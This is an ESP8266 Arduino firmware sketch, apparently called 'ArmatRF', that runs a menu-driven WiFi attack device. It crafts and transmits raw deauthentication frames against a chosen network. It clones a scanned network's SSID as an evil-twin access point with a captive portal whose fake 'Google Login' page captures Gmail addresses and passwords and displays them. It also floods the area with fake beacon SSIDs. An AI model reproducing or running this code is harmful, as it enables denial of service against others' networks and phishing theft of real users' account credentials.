#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
extern "C" {
  #include "user_interface.h"
}

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_ADDR 0x3C

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire);
ESP8266WebServer server(80);
DNSServer dnsServer;

String selectedSSID = "";
String capturedGmail = "";
String capturedPassword = "";

const int Dzax = D5;
const int Enter = D4;
const int Aj = D3;

int dzax = HIGH;
int enter = HIGH;
int aj = HIGH;
int prevDzax = HIGH;
int prevEnter = HIGH;
int prevAj = HIGH;

bool inMainMenu = true;
bool inWiFiMenu = false;
bool wifibajin = true;

// --- Մենյու ցուցակներ ---
String mainMenu[4] = {"WiFi", "BLE", "Settings", "Exit"};
String wifiMenu[4] = {"WiFi-Clon", "WiFi-Deauth", "WiFi-Spam", "Back"};

// --- Deauth Attack ---
#define MAX_NETS 20
String ssidList[MAX_NETS];
uint8_t bssidList[MAX_NETS][6];
int chList[MAX_NETS];
int netCount = 0;
int deauthSelected = 0;
bool deauthRunning = false;

uint8_t deauthPacket[26] = {
  0xC0, 0x00,
  0x3A, 0x01,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00, 0x00,
  0x07, 0x00
};

void setTargetBSSID(uint8_t *bssid) {
  for (int i = 0; i < 6; i++) {
    deauthPacket[10 + i] = bssid[i];
    deauthPacket[16 + i] = bssid[i];
  }
}

void sendDeauth() {
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}

void scanNetworksForDeauth() {
  display.clearDisplay();
  display.setCursor(0,0);
  display.setTextSize(1);
  display.println("Scanning WiFi...");
  display.display();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  netCount = WiFi.scanNetworks();
  if(netCount == 0) {
    display.clearDisplay();
    display.setCursor(0,0);
    display.println("No networks found");
    display.display();
    delay(1500);
    return;
  }

  if(netCount > MAX_NETS) netCount = MAX_NETS;

  for(int n=0; n < netCount; n++) {
    ssidList[n] = WiFi.SSID(n);
    uint8_t *bssidPtr = WiFi.BSSID(n);
    memcpy(bssidList[n], bssidPtr, 6);
    chList[n] = WiFi.channel(n);
  }
}

void startPhishingPage() {
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", []() {
    server.send(200, "text/html",
      "<html><body><center><h2>Google Login</h2>"
      "<form action='/login' method='post'>"
      "Gmail: <input name='gmail' type='text'><br>"
      "Password: <input name='password' type='password'><br>"
      "<input type='submit' value='Login'>"
      "</form></center></body></html>");
  });

  server.on("/login", HTTP_POST, []() {
    capturedGmail = server.arg("gmail");
    capturedPassword = server.arg("password");

    server.send(200, "text/html", "<h2>Thanks! You are logged in.</h2>");

    Serial.println("Gmail: " + capturedGmail);
    Serial.println("Password: " + capturedPassword);

    display.clearDisplay();
    display.setCursor(0, 0);
    display.setTextSize(1);
    display.println("Captured:");
    display.println(capturedGmail);
    display.println(capturedPassword);
    display.display();
  });

  server.onNotFound([]() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });

  server.begin();
}

// === WiFi-Clon with Back option ===
void Clon() {
  int numNetworks = WiFi.scanNetworks();
  int selected = 0;
  int dzax, aj, enter;
  int prevDzax = HIGH, prevAj = HIGH, prevEnter = HIGH;

  int totalOptions = numNetworks + 1; // +1 Back

  while (true) {
    dzax = digitalRead(Dzax);
    aj = digitalRead(Aj);
    enter = digitalRead(Enter);

    if (dzax == LOW && prevDzax == HIGH) selected++;
    if (aj == LOW && prevAj == HIGH) selected--;

    if (selected < 0) selected = totalOptions - 1;
    if (selected >= totalOptions) selected = 0;

    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0, 0);
    display.println("WiFi Networks:");

    int linesToShow = totalOptions > 4 ? 4 : totalOptions;

    for (int i = 0; i < linesToShow; i++) {
      display.setCursor(0, 12 + i * 12);
      if (i == selected) display.print("> ");
      else display.print("  ");

      if (i < numNetworks) {
        display.println(WiFi.SSID(i));
      } else {
        display.println("Back");
      }
    }

    display.display();

    if (enter == LOW && prevEnter == HIGH) {
      if (selected == numNetworks) {
        // Back
        break;
      } else {
        selectedSSID = WiFi.SSID(selected);
        Serial.println("Cloning: " + selectedSSID);

        WiFi.mode(WIFI_AP);
        WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
        WiFi.softAP(selectedSSID.c_str());

        startPhishingPage();

        display.clearDisplay();
        display.setCursor(0, 0);
        display.println("Cloned SSID:");
        display.println(selectedSSID);

        display.print("RSSI: ");
        display.println(WiFi.RSSI(selected));

        display.print("CH: ");
        display.println(WiFi.channel(selected));

        display.print("Enc: ");
        int enc = WiFi.encryptionType(selected);
        switch (enc) {
          case ENC_TYPE_NONE: display.println("Open"); break;
          case ENC_TYPE_WEP: display.println("WEP"); break;
          case ENC_TYPE_TKIP: display.println("WPA"); break;
          case ENC_TYPE_CCMP: display.println("WPA2"); break;
          case ENC_TYPE_AUTO: display.println("Auto"); break;
          default: display.println("Unknown"); break;
        }

        display.println();
        display.println("Press ENTER to stop");
        display.display();

        while (true) {
          int waitEnter = digitalRead(Enter);
          if (waitEnter == LOW) {
            delay(300);
            WiFi.softAPdisconnect(true);
            dnsServer.stop();
            server.stop();
            WiFi.mode(WIFI_STA);
            WiFi.disconnect();
            break;
          }
          dnsServer.processNextRequest();
          server.handleClient();
          delay(10);
        }
      }
    }

    delay(150);
    prevDzax = dzax;
    prevAj = aj;
    prevEnter = enter;
  }
  WiFi.scanDelete();
}

// === Deauth with Back option ===
void deauthMenu() {
  int dzaxLoc = digitalRead(Dzax);
  int ajLoc = digitalRead(Aj);
  int enterLoc = digitalRead(Enter);
  static int prevDzaxLoc = HIGH;
  static int prevAjLoc = HIGH;
  static int prevEnterLoc = HIGH;

  int totalOptions = netCount + 1; // +1 Back

  if (dzaxLoc == LOW && prevDzaxLoc == HIGH) deauthSelected++;
  if (ajLoc == LOW && prevAjLoc == HIGH) deauthSelected--;

  if (deauthSelected < 0) deauthSelected = totalOptions - 1;
  if (deauthSelected >= totalOptions) deauthSelected = 0;

  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println("Select Deauth Target:");

  int linesToShow = totalOptions > 4 ? 4 : totalOptions;

  for(int k=0; k < linesToShow; k++) {
    display.setCursor(0, 12 + k * 12);
    if(k == deauthSelected) display.print("> ");
    else display.print("  ");

    if (k < netCount) {
      display.println(ssidList[k]);
    } else {
      display.println("Back");
    }
  }
  display.display();

  if(enterLoc == LOW && prevEnterLoc == HIGH) {
    if (deauthSelected == netCount) {
      // Back
      deauthRunning = false;
    } else {
      deauthRunning = true;
      wifi_set_channel(chList[deauthSelected]);
      setTargetBSSID(bssidList[deauthSelected]);

      display.clearDisplay();
      display.setCursor(0,0);
      display.println("Attacking:");
      display.println(ssidList[deauthSelected]);
      display.println("Press ENTER to stop");
      display.display();
    }
  }

  prevDzaxLoc = dzaxLoc;
  prevAjLoc = ajLoc;
  prevEnterLoc = enterLoc;
}

void deauthAttackLoop() {
  sendDeauth();
  delay(10);

  int enterLoc = digitalRead(Enter);
  static int prevEnterLoc = HIGH;

  if(enterLoc == LOW && prevEnterLoc == HIGH) {
    deauthRunning = false;
    WiFi.disconnect();
    scanNetworksForDeauth();
    delay(500);
  }
  prevEnterLoc = enterLoc;
}

void runDeauth() {
  if (netCount == 0) {
    scanNetworksForDeauth();
    delay(500);
  }
  deauthSelected = 0;
  while (!deauthRunning) {
    deauthMenu();
    delay(100);
  }
  while (deauthRunning) {
    deauthAttackLoop();
    delay(10);
  }
}

// === Spam WiFi with Back option ===
void spamWiFiMenu() {
  int channel = 1;
  int selected = 0; // 0 = Start Spam, 1 = Back
  int dzax, aj, enter;
  int prevDzax = HIGH, prevAj = HIGH, prevEnter = HIGH;

  while(true) {
    dzax = digitalRead(Dzax);
    aj = digitalRead(Aj);
    enter = digitalRead(Enter);

    if (dzax == LOW && prevDzax == HIGH) selected++;
    if (aj == LOW && prevAj == HIGH) selected--;

    if (selected < 0) selected = 1;
    if (selected > 1) selected = 0;

    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(0, 0);
    display.println("WiFi Spam:");

    display.setCursor(0, 16);
    if (selected == 0) display.print("> ");
    else display.print("  ");
    display.println("Start Spam");

    display.setCursor(0, 28);
    if (selected == 1) display.print("> ");
    else display.print("  ");
    display.println("Back");

    display.display();

    if (enter == LOW && prevEnter == HIGH) {
      if (selected == 1) {
        // Back
        break;
      } else {
        // Start Spam
        while (true) {
          String fakeSSID = "Free_WiFi_" + String(random(1000, 9999));
          WiFi.softAP(fakeSSID.c_str(), "", channel);

          display.clearDisplay();
          display.setCursor(0, 0);
          display.setTextSize(1);
          display.println("Spamming:");
          display.println(fakeSSID);
          display.println("Press ENTER to stop");
          display.display();

          Serial.println("Spammed: " + fakeSSID);

          delay(300);
          WiFi.softAPdisconnect(true);

          channel++;
          if (channel > 13) channel = 1;

          int waitEnter = digitalRead(Enter);
          if (waitEnter == LOW) {
            delay(300);
            WiFi.softAPdisconnect(true);
            WiFi.mode(WIFI_STA);
            break;
          }
        }
      }
    }

    prevDzax = dzax;
    prevAj = aj;
    prevEnter = enter;
    delay(150);
  }
}

void displayMainMenu(int selected) {
  display.clearDisplay();
  display.setTextSize(1);    // Փոքր տառեր
  display.setTextColor(WHITE);
  display.setCursor(20, 0);
  display.println("==Main Menu==");
  for (int j = 0; j < 4; j++) {
    display.setCursor(18, 12 + j * 12); // փոքր տողեր
    if (j == selected) display.print("> ");
    else display.print("  ");
    display.println(mainMenu[j]);
  }
  display.display();
}

void displayWiFiMenu(int selected) {
  display.clearDisplay();
  display.setTextSize(1);    // Փոքր տառեր
  display.setTextColor(WHITE);
  display.setCursor(20, 0);
  display.println("==WiFi Menu==");
  for (int j = 0; j < 4; j++) {
    display.setCursor(18, 12 + j * 12);  // փոքր տողեր
    if (j == selected) display.print("> ");
    else display.print("  ");
    display.println(wifiMenu[j]);
  }
  display.display();
}

void setup() {
  pinMode(Dzax, INPUT_PULLUP);
  pinMode(Aj, INPUT_PULLUP);
  pinMode(Enter, INPUT_PULLUP);
  Serial.begin(9600);

  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
    Serial.println(F("SSD1306 չի գտնվել"));
    while (true);
  }

  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(WHITE);
  display.setCursor(20, 20);
  display.println("ArmatRF");
  display.display();
  delay(1000);

  scanNetworksForDeauth();

  displayMainMenu(0);
}

void loop() {
  dzax = digitalRead(Dzax);
  enter = digitalRead(Enter);
  aj = digitalRead(Aj);

  static int mainSelected = 0;
  static int wifiSelected = 0;

  if (inMainMenu) {
    if (dzax == LOW && prevDzax == HIGH) mainSelected++;
    if (aj == LOW && prevAj == HIGH) mainSelected--;

    if (mainSelected > 3) mainSelected = 0;
    if (mainSelected < 0) mainSelected = 3;

    displayMainMenu(mainSelected);

    if (enter == LOW && prevEnter == HIGH) {
      if (mainMenu[mainSelected] == "WiFi") {
        inMainMenu = false;
        inWiFiMenu = true;
        wifiSelected = 0;
        displayWiFiMenu(wifiSelected);
      }
      else if (mainMenu[mainSelected] == "BLE") {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0,0);
        display.println("BLE ֆունկցիա");
        display.display();
        delay(1500);
        displayMainMenu(mainSelected);
      }
      else if (mainMenu[mainSelected] == "Settings") {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0,0);
        display.println("Settings");
        display.display();
        delay(1500);
        displayMainMenu(mainSelected);
      }
      else if (mainMenu[mainSelected] == "Exit") {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0,0);
        display.println("Exit");
        display.display();
        delay(1500);
      }
    }
  }
  else if (inWiFiMenu) {
    if (dzax == LOW && prevDzax == HIGH) wifiSelected++;
    if (aj == LOW && prevAj == HIGH) wifiSelected--;

    if (wifiSelected > 3) wifiSelected = 0;
    if (wifiSelected < 0) wifiSelected = 3;

    displayWiFiMenu(wifiSelected);

    if (enter == LOW && prevEnter == HIGH) {
      if (wifiMenu[wifiSelected] == "WiFi-Clon") {
        Clon();
      }
      else if (wifiMenu[wifiSelected] == "WiFi-Deauth") {
        runDeauth();
      }
      else if (wifiMenu[wifiSelected] == "WiFi-Spam") {
        spamWiFiMenu();
      }
      else if (wifiMenu[wifiSelected] == "Back") {
        inWiFiMenu = false;
        inMainMenu = true;
        displayMainMenu(mainSelected);
      }
    }
  }

  prevDzax = dzax;
  prevAj = aj;
  prevEnter = enter;

  delay(150);
}
